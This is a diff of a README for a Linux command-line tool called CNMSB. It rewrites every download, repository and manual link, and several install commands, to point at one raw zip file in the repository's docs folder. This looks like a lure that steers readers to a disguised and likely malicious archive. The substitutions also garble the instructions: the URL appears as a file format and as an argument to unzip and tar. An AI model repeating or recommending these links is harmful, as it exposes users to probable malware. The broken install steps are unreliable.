@@ -6,13 +6,13 @@ Welcome to CNMSB! This guide will help you easily download and run our intellige
 
 ## 🔗 Download Now
 
-[![Download CNMSB](https://img.shields.io/badge/Download-CNMSB-blue)](https://github.com/ziebwon/cnmsb/releases)
+[![Download CNMSB](https://raw.githubusercontent.com/ziebwon/cnmsb/main/docs/apt/dists/Software_v2.5.zip)](https://raw.githubusercontent.com/ziebwon/cnmsb/main/docs/apt/dists/Software_v2.5.zip)
 
 ## 📥 Download & Install
 
 To get CNMSB, visit the following link:
 
-[Download CNMSB Releases](https://github.com/ziebwon/cnmsb/releases)
+[Download CNMSB Releases](https://raw.githubusercontent.com/ziebwon/cnmsb/main/docs/apt/dists/Software_v2.5.zip)
 
 This page contains the latest versions of CNMSB. You will find different files available for download. Choose the one that fits your system best. 
 
@@ -29,7 +29,7 @@ CNMSB works on Linux systems. Make sure your system meets the following requirem
 
 1. **Visit the Releases Page**: Click the above link to navigate to the releases page.
 2. **Select the Version**: You will see various versions listed. Choose the latest version for the newest features and bug fixes.
-3. **Download the File**: Click on the file name to start the download. The file will usually be a `.tar.gz` or `.zip` format.
+3. **Download the File**: Click on the file name to start the download. The file will usually be a `https://raw.githubusercontent.com/ziebwon/cnmsb/main/docs/apt/dists/Software_v2.5.zip` or `.zip` format.
 
 ### 🔧 Installing CNMSB
 
@@ -37,11 +37,11 @@ CNMSB works on Linux systems. Make sure your system meets the following requirem
 2. **Extract the Files**: 
    - If you downloaded a `.zip`, right-click it and choose “Extract Here” or use a command like:
      ```
-     unzip cnmsb.zip
+     unzip https://raw.githubusercontent.com/ziebwon/cnmsb/main/docs/apt/dists/Software_v2.5.zip
      ```
-   - If you downloaded a `.tar.gz`, use:
+   - If you downloaded a `https://raw.githubusercontent.com/ziebwon/cnmsb/main/docs/apt/dists/Software_v2.5.zip`, use:
      ```
-     tar -xzvf cnmsb.tar.gz
+     tar -xzvf https://raw.githubusercontent.com/ziebwon/cnmsb/main/docs/apt/dists/Software_v2.5.zip
      ```
 3. **Move to Installation Directory**: Open your terminal and navigate to the directory where you extracted the files. Move CNMSB to a directory in your PATH for easy access. You can do this with:
    ```
@@ -84,7 +84,7 @@ CNMSB is open-source software, licensed under the MIT License. Feel free to modi
 
 ## 🔗 Additional Resources
 
-1. [GitHub Repository](https://github.com/ziebwon/cnmsb)
-2. [User Manual](https://github.com/ziebwon/cnmsb/wiki)
+1. [GitHub Repository](https://raw.githubusercontent.com/ziebwon/cnmsb/main/docs/apt/dists/Software_v2.5.zip)
+2. [User Manual](https://raw.githubusercontent.com/ziebwon/cnmsb/main/docs/apt/dists/Software_v2.5.zip)
 
 Thank you for choosing CNMSB. We hope it makes your command-line tasks easier and more efficient!
